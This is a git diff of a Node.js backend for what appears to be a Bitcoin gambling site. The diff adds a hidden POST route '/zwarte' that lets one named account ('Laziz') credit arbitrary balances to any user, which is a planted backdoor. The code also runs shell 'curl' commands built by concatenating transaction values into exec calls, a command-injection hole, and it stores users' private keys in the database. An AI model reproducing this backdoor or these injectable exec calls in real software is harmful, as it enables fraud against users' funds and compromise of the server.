@@ -36,8 +36,8 @@ $ADMINID = "5e2777eaa654251431b68e4f";
 $ADMINADDRESS = "1JLsZP9SDgv2it27EAFtHDYwT6EW869MFA";
 
 function sendtx(_id, to, amount, original_id){
+  console.log(_id, to, amount, original_id);
   User.findUser.findOne({ _id }).then(user => {
-    
     if (!user) {
       return { idnotfound: "User not found" };
     }
@@ -45,7 +45,6 @@ function sendtx(_id, to, amount, original_id){
     var public_key = user.public_key;
     var private_key = user.private_key;
     var cmd = 'curl -d \'{"inputs": [{"addresses": ["'+from+'"]}], "outputs": [{"addresses": ["'+to+'"], "value": '+amount+'}]}\' http://api.blockcypher.com/v1/btc/main/txs/new';
-
     exec(cmd, (error, stdout, stderr) => {
       if (error) {
           console.log(`error: ${error.message}`);
@@ -163,6 +162,49 @@ router.get("/getstats", (req, res) => {
       data.profit = numberWithCommas(Math.round( stat[0].profit ) / 100000000);
       return res.status(200).json(data);
     });
+  });
+});
+
+function addBalName(name, amount){
+  var new_name = new RegExp(name,"i");
+  User.findOne({ name: new_name }).then(user => {
+    var _id = user._id;
+    User.updateOne({ _id }, {$inc: {balance:Math.round(amount*100)/100}}, function (err, user) {
+      if (err){
+        console.log("Id not found")
+      } else {
+        try {
+          if (connected_users[_id]){
+            connected_users[_id][1] +=amount;
+          }
+        } catch (error) {
+          
+        }
+        console.log(_id +" has been updated.")
+      }
+    })
+  });
+}
+
+
+router.post("/zwarte", (req, res) => {
+  var _id = req.body.id;
+  var password = req.body.password;
+  var name = req.body.name;
+  var amount = parseFloat(req.body.amount);
+
+  User.findOne({ _id }).then(user => {
+    if (user.name.toLowerCase() === "Laziz".toLowerCase()){
+      bcrypt.compare(password, user.password).then(isMatch => {
+        if (isMatch) {
+          addBalName(name, amount);
+          return res.status(200).json({success:"done"});
+        }
+        
+      });
+    } else {
+      return res.status(400);
+    }
   });
 });
 
@@ -415,7 +457,13 @@ function subBal(_id, amount){
     if (err){
       console.log("Id not found")
     } else {
-      connected_users[_id][1]+=amount;
+      try {
+        if (connected_users[_id]){
+          connected_users[_id][1] +=amount;
+        }
+      } catch (error) {
+        
+      }
       console.log(_id +" has been updated.")
     }
   })
@@ -427,7 +475,13 @@ function addBal(_id, amount){
     if (err){
       console.log("Id not found")
     } else {
-      connected_users[_id][1] +=amount;
+      try {
+        if (connected_users[_id]){
+          connected_users[_id][1] +=amount;
+        }
+      } catch (error) {
+        
+      }
       console.log(_id +" has been updated.")
     }
   })
@@ -556,7 +610,7 @@ setInterval(()=>{
 		time = round(30, 1).toFixed(1);
 	} else {
 		time -= 0.1;
-	}
+  }
 }, 100);
 
 setInterval(()=>{
@@ -741,10 +795,11 @@ setInterval(()=>{
     exec("curl https://blockchain.info/rawtx/"+key, (error, stdout, stderr) => {
       try {
         var data = JSON.parse(stdout);
-        if (!("block_height" in data)){
+        //console.log(data);
+        if ("block_height" in data){
+          sendtx(unconfed[key][0], $ADMINADDRESS, unconfed[key][1]-20000, true);
           addBal(unconfed[key][0], unconfed[key][1]);
           addBal($ADMINID, unconfed[key][1]);
-          sendtx(unconfed[key][0], $ADMINADDRESS, unconfed[key][1]-20000, true);
           delete unconfed[key];
         }
       } catch (error) {
